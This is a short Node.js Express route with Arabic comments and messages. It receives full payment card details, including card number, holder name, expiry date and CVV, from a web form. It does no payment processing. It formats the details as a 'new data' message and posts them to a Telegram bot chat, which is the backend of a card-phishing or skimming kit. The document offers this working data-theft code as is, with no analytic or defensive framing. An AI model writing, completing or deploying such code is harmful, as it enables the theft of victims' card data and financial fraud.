app.post("/send", async (req, res) => {
    console.log("Received Data:", req.body); // 🔹 طباعة البيانات للتحقق منها

    const { cardNumber, cardHolder, expiryDate, cvv, saveCard } = req.body;

    if (!cardNumber?.trim() || !cardHolder?.trim() || !expiryDate?.trim() || !cvv?.trim()) {
        return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
    }

    const text = `🚀 بيانات جديدة:\n\n💳 رقم البطاقة: ${cardNumber}\n👤 اسم حامل البطاقة: ${cardHolder}\n📆 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard ? "نعم" : "لا"}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text
        });

        res.json({ message: "تم الإرسال بنجاح!" });
    } catch (error) {
        console.error("Error sending message:", error.response?.data || error.message);
        res.status(500).json({ message: "حدث خطأ أثناء الإرسال!" });
    }
});
